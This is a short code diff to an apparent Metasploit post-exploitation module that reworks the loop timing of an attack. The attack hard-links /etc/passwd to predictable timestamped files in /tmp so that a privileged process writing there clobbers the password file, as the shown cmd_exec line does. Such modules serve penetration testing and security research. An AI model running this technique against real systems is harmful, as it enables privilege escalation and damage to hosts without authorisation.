@@ -69,7 +69,7 @@ class Metasploit3 < Msf::Post
 	end
 
 	def normalize_minutes
-		datastore["MINUTES"].abs rescue 0
+		datastore["MINUTES"].abs rescue 1
 	end
 
 	def run
@@ -78,10 +78,9 @@ class Metasploit3 < Msf::Post
 		print_status "/etc/passwd is currently #{initial_size} lines long"
 		i = 0
 		j = 0
-		loop do
+		while j < normalize_minutes # Give up after X minutes
+			j += 1 # increment the minute counter
 			if (i == 0)
-				j += 1
-				break if j >= datastore['MINUTES'] + 1 # Give up after X minutes
 				# 0a2940: cmd_exec is slow, so send 1 command to do all the links
 				print_status "Linking /etc/passwd to predictable tmp files (Attempt #{j})"
 				cmd_exec("for i in `seq 0 120` ; do ln /etc/passwd /tmp/msf3-session_`date --date=\"\$i seconds\" +%Y-%m-%d_%H-%M-%S`.pcap ; done")
@@ -99,7 +98,7 @@ class Metasploit3 < Msf::Post
 			else
 				break
 			end
-			sleep(1) # wait a second
+			sleep(1)
 			i = (i+1) % 60 # increment second counter
 		end
 
